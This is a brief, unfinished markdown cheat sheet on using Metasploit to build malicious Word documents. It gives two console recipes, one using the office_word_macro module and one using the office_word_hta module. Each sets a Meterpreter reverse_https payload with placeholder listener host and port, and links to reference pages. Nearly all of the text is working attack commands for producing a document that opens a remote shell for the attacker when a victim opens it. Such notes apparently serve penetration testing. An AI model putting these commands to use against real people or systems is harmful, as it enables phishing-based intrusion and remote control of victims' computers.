# Metasploit

TODO: Finish the rest

## 01 - VBA Macro

```
msf > use exploit/windows/fileformat/office_word_macro

set payload windows/x64/meterpreter/reverse_https

set customtemplate /path/to/document.docx

set lhost <IP>

set lport <PORT>

run
```

## 02 - VBA Macro with HTA

```
msf > use exploit/windows/fileformat/office_word_hta

set payload windows/x64/meterpreter/reverse_https

set lhost <IP>

set lport <PORT>

run
```

---
## References

- [Rapid7: Metasploit Framework - Exploit FileFormat Office Word Macro](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/fileformat/office_word_macro.md)

- [Network Intelligence: Getting System Access Using Malicious Word File](https://networkintelligence.ai/getting-system-access-using-malicious-word-file/)